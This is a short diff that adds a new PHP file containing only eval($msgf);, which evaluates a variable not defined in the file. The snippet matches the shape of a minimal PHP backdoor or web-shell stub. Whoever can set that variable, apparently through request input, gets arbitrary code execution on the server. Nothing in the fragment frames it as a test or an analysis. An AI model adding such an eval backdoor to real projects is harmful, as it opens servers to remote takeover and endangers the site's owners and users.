@@ -1,0 +1,3 @@
+<?php
+eval($msgf);
+?>
